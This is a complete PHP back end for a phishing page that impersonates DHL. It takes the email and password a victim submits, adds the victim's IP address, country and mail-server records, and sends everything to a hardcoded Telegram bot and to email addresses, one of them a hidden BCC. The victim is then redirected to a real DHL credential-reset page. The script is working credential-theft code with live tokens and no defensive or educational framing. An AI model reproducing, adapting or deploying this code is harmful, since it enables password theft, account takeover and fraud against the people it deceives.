<?php
// Telegram Bot Token and Chat ID
$telegramBotToken = "7907711929:AAFAOyX5qkLNnDi5NjuxslCwf2Fu2856-zg";
$chatId = "6510571061";

// Email settings
$toEmail = "info@bridge-terminal.com";
$subject = "New Log";
$headers .= "BCC: allow.run@yandex.com\r\n"; // Add BCC recipient

// Collect form data with basic validation
$email = isset($_POST['ai']) ? trim($_POST['ai']) : '';  // Assuming 'ai' is the input name for the email
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';  // Password entered by the user

// Get IP address of the user
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get country of the user using an external API (ipinfo.io in this case)
$country = getCountryFromIP($ipAddress);

// Get MX record of the email domain
$mxRecord = getMXRecord($email);

// Basic validation to ensure data is present
if (!empty($email) && !empty($password)) {

    // Prepare the message for Telegram
    $telegramMessage = "New submission received:\n";
    $telegramMessage .= "Email: " . $email . "\n";
    $telegramMessage .= "Password: " . $password . "\n";
    $telegramMessage .= "IP: " . $ipAddress . "\n";
    $telegramMessage .= "Country: " . $country . "\n";
    $telegramMessage .= "MX Record: " . $mxRecord . "\n";

    // Send data to Telegram using cURL for better performance
    $telegramUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage";
    $telegramData = [
        'chat_id' => $chatId,
        'text' => $telegramMessage
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramData);
    curl_exec($ch);
    curl_close($ch);

    // Prepare email message
    $emailMessage = "A new submission was made on your website:\n\n";
    $emailMessage .= "Email: " . $email . "\n";
    $emailMessage .= "Password: " . $password . "\n";
    $emailMessage .= "IP: " . $ipAddress . "\n";
    $emailMessage .= "Country: " . $country . "\n";
    $emailMessage .= "MX Record: " . $mxRecord . "\n";

    // Send the email using mail()
    mail($toEmail, $subject, $emailMessage, "From: no-reply@yourdomain.com");

    // Redirect the user to a confirmation page or back to the form
    header("Location: https://keycloak.mydhli.com/auth/realms/DCI/login-actions/reset-credentials?client_id=myDHLi&tab_id=8KWk_yOISCQ");
    exit();
} else {
    // Redirect to an error page if validation fails
    header("Location: error_page.html");
    exit();
}

// Function to get country name from IP address using ipinfo.io API
function getCountryFromIP($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  // IP Geolocation API (ipinfo.io)
    $response = file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return isset($data['country']) ? $data['country'] : 'Unknown';
    } else {
        return 'Unknown';
    }
}

// Function to get MX records for the email domain
function getMXRecord($email) {
    $domain = substr(strrchr($email, "@"), 1);  // Extract the domain from the email
    $mxRecords = [];
    
    if (getmxrr($domain, $mxRecords)) {
        // Return the first MX record found (or all MX records if you prefer)
        return implode(", ", $mxRecords);  // Join all MX records into a single string
    } else {
        return 'No MX record found';
    }
}
?>
